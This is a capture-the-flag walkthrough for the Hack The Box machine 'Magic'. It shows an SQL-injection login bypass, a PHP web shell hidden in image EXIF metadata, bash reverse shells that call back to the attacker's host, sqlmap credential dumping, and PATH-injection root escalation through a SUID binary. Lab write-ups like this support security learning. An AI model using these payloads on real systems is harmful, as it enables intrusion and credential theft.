[Magic](https://www.hackthebox.eu/home/machines/profile/241) is a medium linux box by [TRX](https://www.hackthebox.eu/home/users/profile/31190).

### Overview


The box starts with web-enumeration, where we have to bypass a login with SQL-injection. After that we find a image upload functionality. Using the metadata of the image, we are able to smuggle php code that gets interpreted by the server upon access. With this we get code-execution as www-data.

Going back to the SQL-injection we use SQLMap to dump the database and get credentials. Using the creds we can get access as user and read user.txt

To get root we have to abuse path injection in a SUID-binary, which gets us a reverse-shell as root.

# Information Gathering

## Nmap

We begin our enumeration with a nmap scan for open ports.

```bash
root@silence:~# nmap -sC -sV 10.10.10.185
Nmap scan report for 10.10.10.185
Host is up (0.051s latency).

```

# Enumeration
The open ports shown are **22** and **80**. SSH usually is not that interesting, so let’s begin with http.

## HTTP - Port 80
Going to http://10.10.10.185 a website with a couple of images is shown.

![Main webpage](/assets/htb/Magic/webpage-index.png)

The main page does not look interesting at first glance. After pressing the login link we get redirected to the login page.

### Bypassing the login

![Login page](/assets/htb/Magic/webpage-login.png)

After testing some default logins like `admin:admin`, the next step would be to try SQL-Injection.

![Login bypass with SQLi](/assets/htb/Magic/sqli-login.png)

A simple SQL-injection like `admin'#` can bypass the login.

After successful login, we get redirected to upload.php.

![Image upload](/assets/htb/Magic/webpage-img-upload.png)

### Image upload to RCE

Let us try to upload a php file as an image and get code execution this way.
```bash
root@silence:~# cat exploit.gif.php
GIF8 <?php system($_GET['cmd']);?>
root@silence:~# file exploit.gif.php
exploit.gif.php: GIF image data 28735 x 28776
```
Using `GIF8`, which are the magic bytes for a GIF image, we can mask the php file as an image.

![GIF upload not allowed](/assets/htb/Magic/img-notallowed.png)

Uploading the GIF does not seem to be allowed.

We can use exiftool to add PHP-code as a comment to a valid image.

```bash
root@silence:~# exiftool -Comment='<?php echo "<pre>"; system($_REQUEST['cmd']); ?>' chronos.php.jpg
    1 image files updated
root@silence:~# exiftool chronos.php.jpg
ExifTool Version Number         : 11.80
File Name                       : chronos.php.jpg
Directory                       : .
File Size                       : 115 kB
File Modification Date/Time     : 2020:04:27 19:23:39+02:00
File Access Date/Time           : 2020:04:27 19:23:42+02:00
File Permissions                : rw-rw-rw-
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : <?php echo "<pre>"; system($_REQUEST[cmd]); ?>
```

![Uploading image](/assets/htb/Magic/img-uploading.png)

Now let us upload this image and check if code execution is now possible.

![Image uploaded](/assets/htb/Magic/img-uploaded.png)

The image has been uploaded successfully. Let us try to find the upload location. The images on the main page hint that the file is located at http://10.10.10.185/images/uploads/.

![Viewing image](/assets/htb/Magic/img-view.png)

When accessing the image we get printed a lot of blob data. This is a good sign.
Now we can check if we have code execution by supplying the a command via the cmd parameter to the image.

![Checking RCE](/assets/htb/Magic/rce-check.png)

Supplying `ls -alh` as the value for cmd, we can list the contents of uploads directory.

### Getting www-data shell
First we have to create a simple bash-reverse shell script that will be hosted using a python webserver.
```bash
root@silence:~# cat s.sh
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'
```
The bash reverse-shell that will be hosted.

Hosting the reverse-shell using `python3 http.server` we can download the payload from the server with http://10.10.10.185/images/uploads/chronos.php.jpg?cmd=wget+10.10.14.11/s.sh.
```bash
root@silence:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.185 - - [18/Apr/2020 23:35:52] "GET /s.sh HTTP/1.1" 200 -
```
Using http://10.10.10.185/images/uploads/chronos.php.jpg?cmd=bash+s.sh the reverse-shell is executed and returned to the nc listener.
```bash
root@silence:~# nc -lvnp 443
Ncat: Connection from 10.10.10.185:53734.
www-data@ubuntu:/var/www/Magic/images/uploads$
```

# Privesc

Now that we got our initial shell, let us enumerate the system to find a way to escalate our privileges to user.

## Privesc to user

### Enumeration as www-data

```bash
theseus@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic';
    private static $dbHost = 'localhost';
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```
In order to try the password and su to theseus, the shell has to be upgraded first.
```bash
www-data@ubuntu:/var/www/Magic/images/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@silence:~# stty raw -echo
root@silence:~# nc -lvnp 443

www-data@ubuntu:/var/www/Magic/images/uploads$
```
With the upgraded shell su can now be used.

```bash
theseus@ubuntu:/var/www/Magic$ su theseus
Password: iamkingtheseus
su: Authentication failure
```
Seems like the password is not correct. Let us enumerate a bit more.

### Getting passwords from MySQL using SQL-Injection
With the SQL-Injection still in mind, we can try to use sqlmap to leak further information from the database.

Capturing the login request and saving it to a file, in order to ease the use of sqlmap.
```bash
root@silence:~# cat login.req
POST /login.php HTTP/1.1
Host: 10.10.10.185
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.185/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close
Upgrade-Insecure-Requests: 1

username=*&password=*
```
Now we can use the request with SQLMap.
```bash
root@silence:~# sqlmap -r login.req --risk 3 --level 5

[19:51:08] [INFO] (custom) POST parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' inject
able (with --code=302)
[19:51:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'

sqlmap identified the following injection point(s) with a total of 612 HTTP(s) requests:

Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-1771' OR 1469=1469-- rRkM&password=

```
Now with the SQL injection confirmed, we should further enumerate the database.

```bash
root@silence:~# sqlmap -r login.req --risk 3 --level 5 –tables
Database: Magic
[1 table]
+---------------------------------------+
| login                                 |
+---------------------------------------+
```
The login table in the Magic database seems the most interesting. Let us dump this table and see if we can get any new passwords.

```bash
root@silence:~# sqlmap -r login.req --risk 3 --level 5 -T login --dump

Database: Magic
Table: login
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | Th3s3usW4sK1ng | admin    |
+----+----------------+----------+
```
With the newly found password, we can try su once again.
```bash
www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
Password: Th3s3usW4sK1ng
theseus@ubuntu:/var/www/Magic/images/uploads$
```
The found password works with su. Now we have user and can read user.txt.
```bash
theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt
83c7e***************************
```

## Privesc to root

Now that we have a shell as `theseus`, let us enumerate the system to find a way to escalate our privileges to root.

### Enumeration as theseus
Let us check all SUID binaries on the system.
```bash
theseus@ubuntu:~$ find / -executable -perm -4000 2>/dev/null
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
```
`Sysinfo` does not seem like a default binary. Let us further enumerate this binary.

```bash
theseus@ubuntu:~$ ltrace sysinfo
...
setuid(0)
setgid(0)
...
popen("lshw -short", "r")
...
popen("fdisk -l", "r")
...
popen("cat /proc/cpuinfo", "r")
...
popen("free -h", "r")
...
```
All these popen functions call programs without absolute paths, which means the sysinfo binary is susceptible to path-injection.

### Exploiting path injection
The first step of exploiting this vulnerability is to choose one of the called binaries and create a malicious file with the same name in a location we can write to. I have chosen `lshw`, as it is the first binary that is called. Every other binary would work as well.
```bash
theseus@ubuntu:/dev/shm$ cat lshw
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'
theseus@ubuntu:/dev/shm$ chmod +x lshw
```
The next step is to change the environment variable `PATH`.
```bash
theseus@ubuntu:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
The original unchanged `PATH`.

```bash
theseus@ubuntu:/dev/shm$ export PATH=$(pwd):$PATH
theseus@ubuntu:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Now we add `/dev/shm` to the beginning of the current `PATH`. Whenever a binary is now called using relative paths, the system checks all these folders for the binary. The first match will be used.

With the nc listener running in the background the binary can now be executed.

```bash
theseus@ubuntu:/dev/shm$ sysinfo
====================Hardware Info====================
```
Upon running `lshw`, the malicious `lshw` version will be run and the reverse-shell is triggered.

```bash
root@silence:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:36898.
root@ubuntu:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
```
We get a reverse-shell as the user root returned and we can now read root.txt.
```bash
root@ubuntu:/root# cat root.txt
9e707***************************
```

## Personal note

I was able to get 9th user own and 21th root own. It was a lot of fun to compete with all these other talented people for the first 25 owns and I am very proud to be among them.
